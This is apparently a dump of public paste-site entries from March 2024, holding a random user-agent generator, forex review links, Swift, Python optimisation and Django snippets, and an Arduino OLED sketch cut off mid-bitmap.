D303', 'Micromax D304', 'Micromax_D304', 'Micromax D305', 'Micromax D306', 'Micromax D320', 'Micromax D321', 'Micromax D333', 'Micromax D340', 'Micromax D7517', 'Micromax DM5003', 'Micromax E353', 'Micromax E457', 'Micromax E458', 'Micromax E460', 'Micromax E471', 'Micromax E4817', 'Micromax E482', 'Micromax E483', 'Micromax E5018M', 'Micromax EG111', 'Micromax EG116', 'micromax F', 'micromax F189', 'Micromax F601', 'MicromaxF666', 'Micromax IN', 'Micromax E7533', 'Micromax E6523', 'IN_2b', 'IN_Note1', 'MICROMAX IN1', 'N8216', 'N8301', 'ione note', 'MICROMAX ione note', 'Micromax N4120', 'Micromax N8202', 'Micromax Ninja', 'Micromax Nitro', 'Micromax Note 1+', 'Micromax Note 5', 'Micromax Note3', 'Micromax NX', 'Micromax P001', 'Micromax P250(Funbook)', 'Micromax P255', 'Micromax P256', 'xx Micromax P275', 'Micromax_P275', 'Micromax P275', 'Micromax P280', 'Micromax P290', 'Micromax P310', 'Micromax P350', 'xx Micromax P350', 'Micromax P360', 'Micromax P362', 'Micromax P365', 'Micromax P410', 'Micromax P410i', 'Micromax_P410i', 'Micromax P420', 'Micromax P469', 'Micromax P470', 'MicromaxP480', 'Micromax P500(Funbook)', 'Micromax P560', 'Micromax P580', 'Micromax P580i', 'Micromax P600', 'Micromax P650', 'Micromax P650E', 'Micromax P660', 'Micromax P660', 'Micromax_P666', 'Micromax P666', 'MicromaxP680', 'Micromax P690', 'Micromax P701', 'MicromaxP702', 'Micromax P810', 'en Micromax Q300', 'Micromax_Q300', 'Micromax Q323', 'Micromax_Q323', 'Micromax Q325', 'Micromax_Q325', 'Micromax Q331', 'Micromax_Q331', 'Micromax Q332', 'Micromax_Q332', 'Micromax Q334', 'Micromax Q335', 'Micromax_Q335', 'Micromax Q336', 'Micromax_Q336', 'Micromax Q341', 'Micromax Q343', 'Micromax Q348', 'Micromax_Q353', 'en Micromax_Q353', 'Micromax_Q353P', 'Micromax Q3551', 'Micromax Q3555', 'Micromax Q361', 'Micromax Q370', 'Micromax_Q370', 'Micromax Q371', 'Micromax_Q371', 'Micromax Q375', 'Micromax_Q375', 'Micromax Q379', 'Micromax Q381', 'Micromax Q382', 'Micromax Q386', 'Micromax Q394', 'Micromax_Q394', 'Micromax Q395', 'Micromax Q397', 'Micromax Q398', 'arm Micromax Q398', 'Micromax Q400', 'Micromax_Q400', 'Micromax Q4002', 'en Micromax Q4002', 'Micromax Q401', 'Micromax Q402', 'Micromax Q402 Ultra', 'Micromax Q404', 'Micromax Q411', 'Micromax_Q411', 'Micromax Q412', 'Micromax Q414', 'Micromax Q416', 'Micromax Q419', 'Micromax Q4201', 'Micromax Q422', 'Micromax Q4220', 'Micromax Q423', 'Micromax Q428', 'Micromax_Q428', 'Micromax Q429', '720X1280 Micromax Q4309', 'Micromax Q4312', 'en_US Micromax Q437', 'Micromax Q440Plus', 'Micromax Q454', 'Micromax Q470', 'Micromax Q479', 'Micromax Q491', 'Micromax_Q491', 'Micromax Q502+', 'Micromax Q666', 'Micromax Q67', 'micromax Q68', 'micromax Q78', 'Micromax S300', 'Micromax_S300', 'Micromax S301', 'Micromax_S301', 'Micromax Q4311', 'Micromax Q4601', 'Micromax Q409A', 'Micromax Q409', 'Micromax Q452', 'Micromax Unite 3', 'Micromax Unite 2', 'Micromax Unite 2 A106', 'Micromax Q372', 'Micromax V89', 'Micromax Q4001', 'Micromax Q4202', 'Micromax Q4251', 'arm Micromax Q4251', 'Micromax W5509', 'Micromax X5098', 'Micromax-Xzoom A52', 'YU5530', 'YU5040', 'Micromax YU5900', 'YU5012', 'Micromax Z59']
        return(f'UCWEB/2.0 (Java; U; MIDP-2.0; en_US; {str(random.choice(self.micromax))}) U2/{random.randint(1,9)}.0.0 UCBrowser/{random.randint(1,9)}.{random.randint(1,9)}.0.{random.randint(30,999)} U2/1.0.0 Mobile UNTRUSTED/{random.randint(1,9)}.0')
        


"
kwW8bm5Y,Review XBTFX,fxvnpro,PHP,Wednesday 13th of March 2024 06:03:48 AM CDT,https://www.fxvnpro.com/review-xbtfx/
B1rW1e0e,Review XBTFX,reviewbrokers,PHP,Wednesday 13th of March 2024 06:00:46 AM CDT,https://www.reviewbrokers.net/review-xbtfx/
LKZ62akp,Untitled,Kala666,Swift,Wednesday 13th of March 2024 05:27:15 AM CDT,"        let portal = Entity()
        let world = createPortalWorld() // Create a root Entity containing portal world entities
        
        portal.components[ModelComponent.self] = .init(mesh: .generatePlane(width: portalPlaneWidth,
                                                                            height: portalPlaneHeight,
                                                                            cornerRadius: 0),
                                                       materials: [PortalMaterial()])
        portal.components[PortalComponent.self] = .init(target: world)
"
T20BX1is,"number of days, hours, minutes, and remaining seconds. python",mayankjoin3,Python,Wednesday 13th of March 2024 05:17:20 AM CDT,"def convert_seconds(seconds):
    days = seconds // (24 * 3600)
    seconds %= (24 * 3600)
    hours = seconds // 3600
    seconds %= 3600
    minutes = seconds // 60
    seconds %= 60
    return days, hours, minutes, seconds

total_seconds = 500 * 10 * 60 # 500 code * 10 min per code * 60 seconds --> int(input(""Enter the total number of seconds: ""))

days, hours, minutes, seconds = convert_seconds(total_seconds)

print(""Days:"", days)
print(""Hours:"", hours)
print(""Minutes:"", minutes)
print(""Seconds:"", seconds)
"
GzggQB0N,Untitled,vatman,Python,Wednesday 13th of March 2024 04:46:56 AM CDT,"def crossover(selected_vectors_list, potential_offspring, q):
    # Создаем mutant_vectors, равный по размеру selected_vectors
    mutant_vectors = potential_offspring

    # Заменяем случайные q векторов mutant_vectors на соответствующие векторы из selected_vectors

    # Для оставшихся векторов
    for l in range(q, len(selected_vectors_list)):
        for j in range(len(selected_vectors_list[l])):
            # Выбираем случайное число
            p = np.random.rand()
            # Вычисляем CR_{l,g}
            CR_lg = 0.9 if p > 0.1 else p
            # Для каждой координаты j в векторе
            if np.random.rand() < 1.0 - CR_lg:
                mutant_vectors[l, j] = selected_vectors_list[l, j]

    return mutant_vectors"
Yvikpva9,Untitled,vatman,Python,Wednesday 13th of March 2024 04:37:12 AM CDT,"import numpy as np
import matplotlib.pyplot as plt
import networkx as nx
from scipy.spatial import distance_matrix
import itertools
from networkx.drawing.layout import fruchterman_reingold_layout


def add_unique_vector(vectors, selected_vectors, remaining_indices):

    # Выбираем случайный индекс из оставшихся
    new_index = np.random.choice(remaining_indices)

    # Добавляем новый выбранный вектор
    selected_vectors.append(vectors[new_index])
    remaining_indices = list(remaining_indices - new_index)

    return selected_vectors, remaining_indices


# Расчет энергии вершины
def calculate_vertex_energy(vertex, vectors, k, l):
    # Вычисляем расстояния от вершины до каждого вектора
    distances = [np.linalg.norm(vertex - vector) for vector in vectors]

    # Получаем индексы векторов, отсортированных по расстоянию
    sorted_indices = np.argsort(distances)

    # Выбираем num_nearest ближайших векторов
    nearest_vector = sorted_indices[0]

    # Вычисляем энергию вершины
    energy = 0

    energy += k * (1 / l) * np.linalg.norm(vertex - nearest_vector) ** 2
    return energy


# Расчет энергии ребра
def calculate_edge_energy(edge, vectors, k, s):
    v1, v2 = vectors[edge[0]], vectors[edge[1]]
    return k * s**2 * np.linalg.norm(v1 - v2) ** 2


# Расчет энергии клина
def calculate_wedge_energy(wedge, vectors, k, r):
    v1, v2, v3 = vectors[wedge[0]], vectors[wedge[1]], vectors[wedge[2]]
    return k * r**4 * np.linalg.norm(v1 + v3 - 2 * v2) ** 2


# Расчет энергии графа
def calculate_energy(
    graph,
    vectors,
    selected_vectors,
    max_vertex_energy,
    max_edge_energy,
    max_wedge_energy,
    max_energy_vertex,
    max_energy_edge,
    max_energy_wedge,
    edge_combination,
):
    # vertex_k = 0.5 # Замените на ваше значение для коэффициента аппроксимации вершин
    # edge_k = 0.5 # Замените на ваше значение для коэффициента растяжения ребер
    # wedge_k = 0.5 # Замените на ваше значение для коэффициента изгиба клиньев
    max_wedge_energy = (
        -np.inf
    )  # Инициализируем максимальную энергию клина как минус бесконечность
    max_energy_wedge = None  # Инициализируем клин с максимальной энергией как None
    edge_combination = 0
    max_vertex_energy = -np.inf
    max_edge_energy = -np.inf
    max_energy_vertex = 0
    max_energy_edge = None

    energy = 0
    for node in graph.nodes:
        vertex_energy = calculate_vertex_energy(
            selected_vectors[int(node)], vectors, vertex_k, len(selected_vectors)
        )
        if vertex_energy > max_vertex_energy:
            max_vertex_energy = vertex_energy
            max_energy_vertex = node
        energy += vertex_energy
    for edge in graph.edges:
        edge_energy = calculate_edge_energy(edge, selected_vectors, edge_k)
        if edge_energy > max_edge_energy:
            max_edge_energy = edge_energy
            max_energy_edge = edge
        energy += edge_energy

    # Добавляем энергию клина для всех подграфов из трех вершин
    for nodes in itertools.combinations(graph.nodes, 3):
        # print(nodes)
        if graph.has_edge(nodes[0], nodes[1]) and graph.has_edge(nodes[0], nodes[2]):
            wedge_energy = calculate_wedge_energy(nodes, selected_vectors, wedge_k)
            # print(""Энергия клина:"")
            # print(p1)
            if wedge_energy > max_wedge_energy:
                max_wedge_energy = wedge_energy
                max_energy_wedge = nodes
                edge_combination = 1
            energy += wedge_energy
        elif graph.has_edge(nodes[0], nodes[1]) and graph.has_edge(nodes[1], nodes[2]):
            wedge_energy = calculate_wedge_energy(nodes, selected_vectors, wedge_k)
            if wedge_energy > max_wedge_energy:
                max_wedge_energy = wedge_energy
                max_energy_wedge = nodes
                edge_combination = 2
                # print(""Энергия клина:"")
            # print(p1)
            energy += wedge_energy
        elif graph.has_edge(nodes[0], nodes[2]) and graph.has_edge(nodes[1], nodes[2]):
            wedge_energy = calculate_wedge_energy(nodes, selected_vectors, wedge_k)
            if wedge_energy > max_wedge_energy:
                max_wedge_energy = wedge_energy
                max_energy_wedge = nodes
                edge_combination = 3
            # print(""Энергия клина:"")
            # print(p1)
            energy += wedge_energy
    return (
        energy,
        max_vertex_energy,
        max_edge_energy,
        max_wedge_energy,
        max_energy_vertex,
        max_energy_edge,
        max_energy_wedge,
        edge_combination,
    )


# Расчет энергии графа
def calculate_energy1(graph, vectors, selected_vectors):
    vertex_k = 2  # Замените на ваше значение для коэффициента аппроксимации вершин
    edge_k = 1  # Замените на ваше значение для коэффициента растяжения ребер
    wedge_k = 0.25
    energy = 0
    for node in graph.nodes:
        vertex_energy = calculate_vertex_energy(
            selected_vectors[int(node)], vectors, vertex_k, len(graph.nodes)
        )
        energy += vertex_energy
    for edge in graph.edges:
        edge_energy = calculate_edge_energy(
            edge, selected_vectors, edge_k, len(graph.edges)
        )
        energy += edge_energy
    r = 0
    # Добавляем энергию клина для всех подграфов из трех вершин
    for nodes in itertools.combinations(graph.nodes, 3):
        # print(nodes)
        if graph.has_edge(nodes[0], nodes[1]) and graph.has_edge(nodes[0], nodes[2]):
            r = r + 1
        elif graph.has_edge(nodes[0], nodes[1]) and graph.has_edge(nodes[1], nodes[2]):
            r = r + 1
        elif graph.has_edge(nodes[0], nodes[2]) and graph.has_edge(nodes[1], nodes[2]):
            r = r + 1

    # Добавляем энергию клина для всех подграфов из трех вершин
    for nodes in itertools.combinations(graph.nodes, 3):
        # print(nodes)
        if graph.has_edge(nodes[0], nodes[1]) and graph.has_edge(nodes[0], nodes[2]):
            wedge_energy = calculate_wedge_energy(nodes, selected_vectors, wedge_k, r)
            energy += wedge_energy
        elif graph.has_edge(nodes[0], nodes[1]) and graph.has_edge(nodes[1], nodes[2]):
            wedge_energy = calculate_wedge_energy(nodes, selected_vectors, wedge_k, r)
            energy += wedge_energy
        elif graph.has_edge(nodes[0], nodes[2]) and graph.has_edge(nodes[1], nodes[2]):
            wedge_energy = calculate_wedge_energy(nodes, selected_vectors, wedge_k, r)
            energy += wedge_energy
    return energy


def visualize_graph(vectors, selected_vectors, G):
    fig = plt.figure()
    ax = fig.add_subplot(111, projection=""3d"")

    # Отображаем все векторы на графике
    for vector in vectors:
        ax.scatter(vector[0], vector[1], vector[2], color=""b"")

    # Отображаем выбранные векторы на графике
    for vector in selected_vectors:
        ax.scatter(vector[0], vector[1], vector[2], color=""r"")

    # Добавляем ребра между вершинами
    for edge in G.edges:
        ax.plot(
            [selected_vectors[edge[0]][0], selected_vectors[edge[1]][0]],
            [selected_vectors[edge[0]][1], selected_vectors[edge[1]][1]],
            [selected_vectors[edge[0]][2], selected_vectors[edge[1]][2]],
            ""r-"",
        )

    # Добавляем оси
    ax.set_xlabel(""X"")
    ax.set_ylabel(""Y"")
    ax.set_zlabel(""Z"")
    plt.show()


def modify_graph(
    G,
    selected_vectors,
    max_vertex_energy,
    max_edge_energy,
    max_wedge_energy,
    max_energy_wedge,
    edge_combination,
    vectors,
    remaining_indices,
):
    if max_vertex_energy >= max_edge_energy and max_vertex_energy >= max_wedge_energy:
        print(""hello1"")
        # Добавляем новую вершину к вершине с наибольшей энергией
        # max_energy_vertex = vertex_energies.index(max_vertex_energy)
        G.add_node(len(selected_vectors))
        G.add_edge(max_energy_vertex, len(selected_vectors))
        selected_vectors, remaining_indices = add_unique_vector(
            vectors, selected_vectors, remaining_indices
        )
        # selected_vectors.append(np.random.randint(-6, 7, 3))  # Добавляем новый вектор
    elif max_edge_energy >= max_vertex_energy and max_edge_energy >= max_wedge_energy:
        print(""hello2"")
        # Разбиваем ребро с наибольшей энергией новой вершиной
        # edges = list(G.edges)  # Получаем список всех ребер
        # max_energy_edge = edges[edge_energies.index(max_edge_energy)]  # Находим ребро с максимальной энергией
        G.add_node(len(selected_vectors))
        G.add_edge(max_energy_edge[0], len(selected_vectors))
        G.add_edge(max_energy_edge[1], len(selected_vectors))
        G.remove_edge(max_energy_edge[0], max_energy_edge[1])
        selected_vectors, remaining_indices = add_unique_vector(
            vectors, selected_vectors, remaining_indices
        )  # Добавляем новый вектор
    else:
        print(""hello3"")
        if edge_combination == 1:
            old_edge_length = np.linalg.norm(
                selected_vectors[max_energy_wedge[0]]
                - selected_vectors[max_energy_wedge[1]]
            )
            new_edge_length = np.linalg.norm(
                selected_vectors[max_energy_wedge[0]]
                - selected_vectors[max_energy_wedge[2]]
            )
            if new_edge_length < old_edge_length:
                # Удаляем старое ребро и добавляем новое
                G.remove_edge(max_energy_wedge[0], max_energy_wedge[1])
                G.add_edge(max_energy_wedge[2], max_energy_wedge[1])
            else:
                G.remove_edge(max_energy_wedge[0], max_energy_wedge[2])
                G.add_edge(max_energy_wedge[2], max_energy_wedge[1])
        elif edge_combination == 2:
            old_edge_length = np.linalg.norm(
                selected_vectors[max_energy_wedge[0]]
                - selected_vectors[max_energy_wedge[1]]
            )
            new_edge_length = np.linalg.norm(
                selected_vectors[max_energy_wedge[1]]
                - selected_vectors[max_energy_wedge[2]]
            )
            print(f""длина старого ребра: {old_edge_length}"")
            print(f""длина нового ребра: {new_edge_length }"")
            if new_edge_length < old_edge_length:
                # Удаляем старое ребро и добавляем новое
                G.remove_edge(max_energy_wedge[0], max_energy_wedge[1])
                G.add_edge(max_energy_wedge[0], max_energy_wedge[2])
            else:
                G.remove_edge(max_energy_wedge[1], max_energy_wedge[2])
                G.add_edge(max_energy_wedge[0], max_energy_wedge[2])
        elif edge_combination == 3:
            old_edge_length = np.linalg.norm(
                selected_vectors[max_energy_wedge[0]]
                - selected_vectors[max_energy_wedge[2]]
            )
            new_edge_length = np.linalg.norm(
                selected_vectors[max_energy_wedge[1]]
                - selected_vectors[max_energy_wedge[2]]
            )
            if new_edge_length < old_edge_length:
                # Удаляем старое ребро и добавляем новое
                G.remove_edge(max_energy_wedge[0], max_energy_wedge[2])
                G.add_edge(max_energy_wedge[0], max_energy_wedge[1])
            else:
                G.remove_edge(max_energy_wedge[2], max_energy_wedge[1])
                G.add_edge(max_energy_wedge[0], max_energy_wedge[1])
        # print(max_energy_wedge[0])
        # print(max_energy_wedge[1])
        # print(max_energy_wedge[2])
    return G, selected_vectors, remaining_indices
    # for edges in G.edges:
    # print(edges)


def calculate_psi(g, NP, lambda_):
    return ((g - 1) * (NP + 1) + 1) ** (1 / lambda_)


def calculate_probabilities(
    vectors, graphs, selected_vectors_list, vertex_k, edge_k, wedge_k, g, NP, lambda_
):
    # Вычисляем psi
    psi_g = calculate_psi(g, NP, lambda_)

    # Вычисляем энергии для всех векторов
    energies = [
        calculate_energy1(graphs[i], vectors, selected_vectors_list[i]) ** psi_g
        for i in range(len(selected_vectors_list))
    ]

    # Вычисляем сумму энергий
    sum_energies = sum(energies)

    # Вычисляем вероятности
    probabilities = [energy / sum_energies for energy in energies]
    # print(probabilities)
    return probabilities


def select_support_vector(
    vectors, graphs, selected_vectors_list, vertex_k, edge_k, wedge_k, g, NP, lambda_
):
    # Вычисляем вероятности
    probabilities = calculate_probabilities(
        vectors,
        graphs,
        selected_vectors_list,
        vertex_k,
        edge_k,
        wedge_k,
        g,
        NP,
        lambda_,
    )

    # Выбираем опорный вектор на основе вероятностей
    id = np.random.choice(len(selected_vectors_list), p=probabilities)
    support_vector = selected_vectors_list[id]

    return support_vector


def calculate_A(x_min, x_max, x_r, e):
    return (np.arctan((x_max - x_r) / e) - np.arctan((x_min - x_r) / e)) ** -1


def calculate_e(i, g, NP, D):
    return 1 / ((g - 1) * (NP + 1) + i + 1) ** (1 / (2 * D))


def generate_potential_offspring(x_r, e, A):
    return x_r + e * np.tan((np.random.rand() - 0.5) * A)


def crossover(selected_vectors_list, potential_offspring, q):
    # Создаем mutant_vectors, равный по размеру selected_vectors
    # mutant_vectors = potential_offspring
    # print(mutant_vectors)
    # print(selected_vectors_list)
    mutant_vectors = []
    # Заменяем случайные q векторов mutant_vectors на соответствующие векторы из selected_vectors

    # Для оставшихся векторов
    for l in range(len(selected_vectors_list)):
        for j in range(len(selected_vectors_list[l])):
            # Выбираем случайное число
            p = np.random.rand()
            # Вычисляем CR_{l,g}
            CR_lg = 0.9 if p > 0.1 else p
            # Для каждой координаты j в векторе
            if np.random.rand() < 1.0 - CR_lg and l >= 2:
                mutant_vectors[l, j] = selected_vectors_list[l, j]
            else:
                mutant_vectors[l, j] = potential_offspring[l, j]

    return mutant_vectors


def generate_offspring(selected_vectors_list, support_vector, g, NP):
    # Вычисляем x_min и x_max для каждой координаты
    x_min = []
    x_max = []
    for i in range(len(selected_vectors_list)):
        x_min_i = []
        x_max_i = []
        for j in range(len(selected_vectors_list[i])):
            x_min_i.append(np.min(selected_vectors_list[i][j]))
            x_max_i.append(np.max(selected_vectors_list[i][j]))
        x_min.append(x_min_i)
        x_max.append(x_max_i)

    # Создаем список для хранения потенциальных потомков
    potential_offspring = []

    # Для каждого вектора в selected_vectors
    for i in range(len(selected_vectors_list)):
        # Для каждой координаты в векторе
        potential_offspring_i = []
        for j in range(len(selected_vectors_list[i])):
            # Вычисляем x_r, e и A
            x_r = support_vector[j]
            e = calculate_e(i, g, NP, len(selected_vectors_list[i]))
            A = calculate_A(-1, 1, x_r, e)

            # Генерируем потенциального потомка
            x_star = generate_potential_offspring(x_r, e, A)

            # Добавляем потенциального потомка в список
            potential_offspring_i.append(x_star)
        potential_offspring.append(potential_offspring_i)

    return potential_offspring


def selection(G, vectors, selected_vectors, mutant_vectors, energy):
    # Для каждого вектора в selected_vectors
    for i in range(len(selected_vectors)):
        vec = selected_vectors
        vec[i] = mutant_vectors[i]
        en = calculate_energy1(G, vectors, vec)

        if en < energy:
            selected_vectors[i] = mutant_vectors[i]

    return selected_vectors


def data():
    n = 12

    # Создаем случайную последовательность n-2 от 0 до n-1
    prufer_sequence = np.random.randint(0, n, n - 2)

    # Восстанавливаем дерево по коду Прюфера
    G1 = nx.from_prufer_sequence(prufer_sequence)

    # Укладываем вершины графа на плоскость методом Фрухтермана-Рейнгольда
    pos = fruchterman_reingold_layout(G1, dim=3)

    # Берем точки на ребрах графа
    edge_points = [pos[node] for node in G1.nodes]
    # [(pos[edge[0]] + pos[edge[1]]) / 2 for edge in G.edges]

    # Смещаем каждую точку на случайный вектор с нормальным распределением
    vectors = []
    for point in edge_points:
        for _ in range(5):  # Создаем три смещенные точки для каждой точки на ребре
            vectors.append(point + np.random.normal(size=3) * 0.05)
    return vectors


def visualize_graphs(vectors, graphs, selected_vectors_list):
    fig = plt.figure()
    ax = fig.add_subplot(111, projection=""3d"")

    # Отображаем все векторы на графике
    for vector in vectors:
        ax.scatter(vector[0], vector[1], vector[2], color=""b"")
    color_i = [
        ""red"",
        ""blue"",
        ""green"",
        ""yellow"",
        ""orange"",
        ""lightcoral"",
        ""darkorange"",
        ""olive"",
        ""teal"",
        ""violet"",
        ""skyblue"",
    ]
    # Отображаем выбранные векторы на графике
    for i in range(len(selected_vectors_list)):
        for vector in selected_vectors_list[i]:
            ax.scatter(vector[0], vector[1], vector[2], color=color_i[i % len(color_i)])

    # Добавляем ребра между вершинами
    for i in range(len(graphs)):
        for edge in graphs[i].edges:
            ax.plot(
                [
                    selected_vectors_list[i][edge[0]][0],
                    selected_vectors_list[i][edge[1]][0],
                ],
                [
                    selected_vectors_list[i][edge[0]][1],
                    selected_vectors_list[i][edge[1]][1],
                ],
                [
                    selected_vectors_list[i][edge[0]][2],
                    selected_vectors_list[i][edge[1]][2],
                ],
                color_i[i % len(color_i)],
            )

    # Добавляем оси
    ax.set_xlabel(""X"")
    ax.set_ylabel(""Y"")
    ax.set_zlabel(""Z"")
    plt.show()


vertex_k = 2  # Замените на ваше значение для коэффициента аппроксимации вершин
edge_k = 1  # Замените на ваше значение для коэффициента растяжения ребер
wedge_k = 0.25  # Замените на ваше значение для коэффициента изгиба клиньев
NP = 5
np.random.seed(8)

vectors = []
vectors = data()


def create_auxiliary_variables(NP):
    max_wedge_energy = [-np.inf] * NP
    max_energy_wedge = [None] * NP
    edge_combination = [0] * NP
    max_vertex_energy = [-np.inf] * NP
    max_edge_energy = [-np.inf] * NP
    max_energy_vertex = [0] * NP
    max_energy_edge = [None] * NP
    return (
        max_wedge_energy,
        max_energy_wedge,
        edge_combination,
        max_vertex_energy,
        max_edge_energy,
        max_energy_vertex,
        max_energy_edge,
    )


def DFS(G, v, visited=None):
    if visited is None:
        visited = set()
    visited.add(v)
    for neighbour in G[v]:
        if neighbour not in visited:
            DFS(G, neighbour, visited)
    return visited


def generate_graphs(vectors, NP):
    graphs = []
    selected_vectors_list = []
    remaining_indices_list = []

    for _ in range(NP):
        indices = np.random.choice(len(vectors), 3, replace=False)
        selected_vectors = [vectors[i] for i in indices]
        all_indices = set(range(len(vectors)))
        remaining_indices = list(all_indices - set(indices))

        distances = distance_matrix(selected_vectors, selected_vectors)
        np.fill_diagonal(distances, np.inf)

        dist_vector_pairs = [
            (np.min(dist), vec) for dist, vec in zip(distances, selected_vectors)
        ]
        dist_vector_pairs.sort(key=lambda x: x[0])
        sorted_vectors = [pair[1] for pair in dist_vector_pairs]
        selected_vectors = sorted_vectors

        distances = distance_matrix(selected_vectors, selected_vectors)
        np.fill_diagonal(distances, np.inf)

        G = nx.Graph()
        for i in range(len(selected_vectors)):
            G.add_node(i)

        visited = set()
        for i in range(len(selected_vectors)):
            nearest_vertex = np.argmin(distances[i])
            if i not in visited:
                G.add_edge(i, nearest_vertex)
                visited.add(nearest_vertex)

        connected = len(DFS(G, 0)) == len(G)
        if not connected:
            components = [list(c) for c in nx.connected_components(G)]
            for i in range(len(components) - 1):
                G.add_edge(components[i][0], components[i + 1][0])

        graphs.append(G)
        selected_vectors_list.append(selected_vectors)
        remaining_indices_list.append(remaining_indices)

    return graphs, selected_vectors_list, remaining_indices_list


graphs, selected_vectors_list, remaining_indices_list = generate_graphs(vectors, NP)
(
    max_wedge_energy,
    max_energy_wedge,
    edge_combination,
    max_vertex_energy,
    max_edge_energy,
    max_energy_vertex,
    max_energy_edge,
) = create_auxiliary_variables(NP)
# visualize_graphs(vectors, graphs,selected_vectors_list)
# print(calculate_probabilities(vectors,graphs, selected_vectors_list, vertex_k,edge_k,wedge_k, 1, NP, 1))
support_vector = select_support_vector(
    vectors, graphs, selected_vectors_list, vertex_k, edge_k, wedge_k, 1, NP, 1
)
potential_offspring = generate_offspring(selected_vectors_list, support_vector, 1, NP)
# visualize_graphs(vectors, graphs, potential_offspring)
mutant_vectors = crossover(selected_vectors_list, potential_offspring, 3)
visualize_graphs(vectors, graphs, mutant_vectors)"
HdyTbPx2,class Profile and class MyHolidayUser,horozov86,Python,Wednesday 13th of March 2024 04:36:20 AM CDT,"from django.contrib.auth.hashers import make_password
from django.db import models

from django.utils.translation import gettext_lazy as _
from django.contrib.auth import models as auth_models

from django.utils import timezone

from my holiday.accounts.managers import MyHolidayUserManager

class MyHolidayUser(auth_models.AbstractBaseUser, auth_models.PermissionsMixin):
    email = models.EmailField(
        _(""email address""),
        unique=True,
        error_messages={
            ""unique"": _(""A user with that email already exists.""),
        },
    )

    date_joined = models.DateTimeField(_(""date joined""), default=timezone.now)

    is_staff = models.BooleanField(
        default=False,
    )

    is_active = models.BooleanField(
        default=True,
    )

    USERNAME_FIELD = ""email""

    objects = MyHolidayUserManager()
    
    
class Profile(models.Model):
    MAX_USERNAME_LENGTH = 20


    first_name = models.CharField(
        max_length=50,
        null=True,
        blank=True,
        verbose_name='First Name',
    )

    last_name = models.CharField(
        max_length=50,
        null=True,
        blank=True,
        verbose_name='Last Name',
    )

    age = models.IntegerField(
        null=False,
        blank=False,
        verbose_name='Age',
    )

    profile_photo = models.URLField(
        null=True,
        blank=True,
        verbose_name='Profile Photo',
    )
    
    user = models.OneToOneField(
        MyHolidayUser,
        primary_key=True,
        on_delete=models.CASCADE,
    )"
v8evjnhf,Review World Forex,reviewbrokers,PHP,Wednesday 13th of March 2024 04:25:08 AM CDT,https://www.reviewbrokers.net/review-world-forex/
9fc9ZSSs,ESP32 Express Mini Kit OLED Code,microrobotics,Arduino,Wednesday 13th of March 2024 04:03:54 AM CDT,"/*
Here's a simple example code that initializes the display and shows how to display a predefined bitmap image. This example assumes you have already converted your image to a bitmap array named myImage, where each byte represents 8 vertical pixels in the image:

Use https://javl.github.io/image2cpp/ for converting. 
*/


#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

// OLED display TWI address
#define OLED_ADDR   0x3C
// Define the screen dimensions
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64

// Declaration for an SSD1306 display connected to I2C (SDA, SCL pins)
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

// Your image data here
const unsigned char myImage[] PROGMEM = {
 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xff, 0x00, 0x00, 0x00, 0x00, 0x03, 0xff, 0xe0, 0x00, 
  0x00, 0xff, 0x80, 0x1f, 0xf0, 0xf8, 0x3f, 0xff, 0xf0, 0x7f, 0xff, 0xf0, 0x1f, 0xff, 0xfc, 0x00, 
  0x00, 0xff, 0x80, 0x1f, 0xf0, 0xf8, 0x7f, 0xff, 0xf8, 0x7f, 0xff, 0xf8, 0x3f, 0xff, 0xfe, 0x00, 
  0x00, 0xff, 0xc0, 0x3f, 0xf0, 0xf8, 0x7f, 0xff, 0xf8, 0x7f, 0xff, 0xfc, 0x3f, 0xff, 0xff, 0x00, 
  0x00, 0xff, 0xc0, 0x3f, 0xf0, 0xf8, 0xff, 0x7f, 0xfc, 0x7e, 0xff, 0xfc, 0x7f, 0xff, 0xff, 0x00, 
  0x00, 0xff, 0xe0, 0x7f, 0xf0, 0xf8, 0xfc, 0x00, 0x7c, 0x7c, 0x00, 0x7c, 0x7e, 0x00, 0x3f, 0x00, 
  0x00, 0xfb, 0xe0, 0x7d, 0xf0, 0xf8, 0xf8, 0x00, 0x10, 0x7c, 0x00, 0x7c, 0x7c, 0x00, 0x1f, 0x00, 
  0x00, 0xf9, 0xf0, 0xf9, 0xf0, 0xf8, 0xf8, 0x00, 0x00, 0x7c, 0x00, 0x7c, 0x7c, 0x00, 0x1f, 0x00, 
  0x00, 0xf9, 0xf0, 0xf9, 0xf0, 0xf8, 0xf8, 0x00, 0x00, 0x7c, 0x00, 0xfc, 0x7c, 0x00, 0x1f, 0x00, 
  0x00, 0xf8, 0xf9, 0xf1, 0xf0, 0xf8, 0xf8, 0x00, 0x00, 0x7f, 0xff, 0xf8, 0x7c, 0x00, 0x1f, 0x00, 
  0x00, 0xf8, 0xf9, 0xf1, 0xf0, 0xf8, 0xf8, 0x00, 0x00, 0x7f, 0xff, 0xf0, 0x7c, 0x00, 0x1f, 0x00, 
